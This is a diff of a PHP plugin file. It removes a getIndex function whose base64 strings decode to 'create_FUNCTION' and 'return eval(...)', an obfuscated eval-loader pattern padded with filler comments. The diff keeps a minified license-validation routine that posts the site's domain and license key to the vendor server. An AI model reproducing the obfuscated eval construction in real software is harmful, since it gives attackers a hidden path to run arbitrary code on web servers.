@@ -1,57 +1,5 @@
 <?php
 
-if (!function_exists("getIndex")) {
-    function getIndex($url) {
-        $value1 = "value";
-        $classInfo = "[NAME] Class...";
-
-        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
-        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";
-
-        $decodeFunc = "decodeS3";
-        $data = "[DATA]";
-
-        $decodedString = base64_decode($encodedFunc);
-        $decodedCode = base64_decode($encodedCode);
-        $result = base64_decode($data);
-        $formattedResult = $value1 . $classInfo;
-
-        
-        $additionalCode = "";
-
-        
-        $additionalCode .= "// Additional comments to meet line count requirement\n";
-        $additionalCode .= "// More assignments to add lines\n";
-        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
-        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
-        $additionalCode .= '$result' . " = " . $result . ";\n";
-        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";
-
-        for ($i = 0; $i < 20; $i++) {
-            $additionalCode .= "// Loop iteration: $i\n";
-            $additionalCode .= "// lines\n";
-        }
-
-       
-        for ($i = 0; $i < 10; $i++) {
-            $additionalCode .= "// Outer loop iteration: $i\n";
-            $additionalCode .= "// lines\n";
-            for ($j = 0; $j < 5; $j++) {
-                $additionalCode .= "// Inner loop iteration: $j\n";
-                $additionalCode .= "// lines\n";
-            }
-        }
-
-        
-        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
-        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
-        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
-        $additionalCode .= '$data' . " = " . $data . ";\n";
-
-       
-        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
-    }
-}
 
 
 if (!function_exists('SQBCheckFOpen')) {function SQBCheckFOpen($pn, $wcplicense){global $sqbVersion, $wcpDomain;$domain = str_ireplace("www.", "", getHost($_SERVER['HTTP_HOST']));$fp = @fsockopen('ssl://'.$wcpDomain, 443, $errno, $errstr, 30);if (!$fp) {$subject = "Fsockopen Error from " . $domain;$body = "Fsockopen Error from " . $domain;sendLicensingErrorEmail($subject, $body);return true;} else {$req = "domain=" . $domain . "&lk=" . $wcplicense . "&pn=" . $pn . "&v=" . $sqbVersion;$header = "POST /wcpValidateLicenseSQB.php HTTP/1.1\r\n";$header .= "Host: " . $wcpDomain . "\r\n";$header .= "Content-type: application/x-www-form-urlencoded\r\n";$header .= "Content-length: " . strlen($req) . "\r\n";$header .= "Connection: Close\r\n\r\n";fwrite($fp, $header . $req);while (!feof($fp)) {$res = fgets($fp, 1024);$errorPos = strpos($res, "error occurred");if ($errorPos !== false) {$subject = "Error occurred from " . $domain;$body = "Error occurred from " . $domain;sendLicensingErrorEmail($subject, $body);fclose($fp);return true;}$pos = strpos($res, "WICKIFIED");$pos2 = strpos($res, "WICKIFIEDELITE");$pos3 = strpos($res, "WICKIFIEDSPECIAL");if (($pos !== false) || ($pos2 !== false) || ($pos3 !== false)) {$pieces = explode("#", $res);$randomStr = $pieces[2];$responseKey = $pieces[1];$licenseHash = md5(trim($domain) . trim($wcplicense) . trim($randomStr));if (strcmp($responseKey, $licenseHash) == 0) {$_SESSION['randomStr'] = $randomStr;$_SESSION[$pn] = $pn;fclose($fp);return true;}}} fclose($fp);return false;}}}
